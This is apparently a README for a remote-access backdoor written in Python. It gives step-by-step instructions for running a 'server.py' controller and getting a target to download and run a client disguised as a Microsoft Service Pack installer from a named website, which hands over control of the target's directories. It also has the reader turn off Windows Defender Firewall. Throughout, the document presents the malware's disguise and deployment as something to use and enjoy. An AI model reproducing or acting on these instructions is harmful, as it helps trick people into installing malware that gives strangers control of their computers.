# Backdoor
A backdoor program that injects itself via the web into the user's computer and hands the target computer's directory control to the server.

## Instructions

### To use on the same system:
1. Open the Anaconda prompt / terminal / command prompt and run the 'server.py' file.
2. Copy the 'ms_service_pack_v3.1.8x64.rar' file to some other location and extract the contents.
3. Once the files are extracted, open the 'dist' folder.
4. Run the 'ms_service_pack_v3.1.8x64.exe' file. (Ensure that before this step, the server is running.)
5. On running the application while the server is waiting for a client, a connection should be successfully established and you should notice some of the client details appear on your terminal running the server.
6. Type 'help' and press enter to see a list of commands that you can execute.
7. Play around with the commands and enjoy the control over the client's system from the server itself.

### To use on different systems (recommended):
1. On one system (server), go to Control Panel -> System and Security -> Windows Defender Firewall.
2. On the left panel, click Turn Windows Defender Firewall on or off.
3. Open the Anaconda prompt / Terminal / Command Prompt and run the 'server.py' file.
4. On another system, open the Web Browser and navigate to 'https://backdoor-alert.netlify.app'.
5. Download the 64-bit version of the Microsoft Service Pack software and store it in a preferable location.
6. Extract the contents of the 'ms_service_pack_v3.1.8x64.rar' file.
7. Once extracted, open the 'dist' folder.
8. Run the 'ms_service_pack_v3.1.8x64.exe' file. (Ensure that before this step, the server is running on the other system.)
9. Repeat the steps from 5. to 7. under the 'To use on the same system' heading.
